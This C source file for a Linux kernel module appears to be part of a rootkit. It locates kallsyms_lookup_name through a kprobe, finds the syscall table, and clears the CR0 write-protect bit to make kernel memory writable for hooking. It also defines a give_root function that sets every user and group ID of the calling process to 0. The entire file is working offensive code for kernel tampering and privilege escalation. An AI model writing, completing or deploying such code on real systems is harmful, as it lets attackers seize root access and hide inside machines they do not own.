#include <linux/unistd.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/kprobes.h>
#include <linux/string.h>

#include <asm/special_insns.h>
#include <uapi/asm/processor-flags.h>

#include "hooking.h"

// Function pointer for read
typedef int (*sysfun_t)(struct pt_regs *);

// Function pointer for kallsyms_lookup_name
typedef void *(*kallsyms_t)(const char *);
kallsyms_t lookup_name;

// Pointer to syscall table
unsigned long *syscall_table = 0;

// cr0 status
unsigned long cr0;

void cr0_write(unsigned long val)
{
    asm volatile("mov %0,%%cr0"
                 : "+r"(val)
                 :
                 : "memory");
}

unsigned long unprotect_memory(void)
{
    unsigned long cr0;
    unsigned long newcr0;

    cr0 = native_read_cr0();
    newcr0 = cr0 & ~(X86_CR0_WP);
    cr0_write(newcr0);
    return cr0;
}

void protect_memory(unsigned long val)
{
    cr0_write(val);
}

void get_kallsyms_funcptr(void)
{
    // declare what we need to find
    struct kprobe probe = {
        .symbol_name = "kallsyms_lookup_name"};

    if (register_kprobe(&probe))
    {
        printk(KERN_ERR "Huge fuck up, couldn't find kallsyms blah blah");
    }

    lookup_name = (kallsyms_t)(probe.addr);
    unregister_kprobe(&probe);

    printk(KERN_INFO "kallsyms_lookup_name @ %p\n", lookup_name);
}

void get_syscall_table(void)
{
    syscall_table = (long unsigned int *)lookup_name("sys_call_table");
    if (!syscall_table)
    {
        printk(KERN_ERR "Couldn't find syscall table");
        return;
    }
    printk(KERN_INFO "Found syscall table @ %p", syscall_table);
}

void give_root(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();

    printk(KERN_INFO "Giving root to %d", newcreds->uid.val);

	newcreds->uid.val = newcreds->gid.val = 0;
	newcreds->euid.val = newcreds->egid.val = 0;
	newcreds->suid.val = newcreds->sgid.val = 0;
	newcreds->fsuid.val = newcreds->fsgid.val = 0;
    commit_creds(newcreds);
}
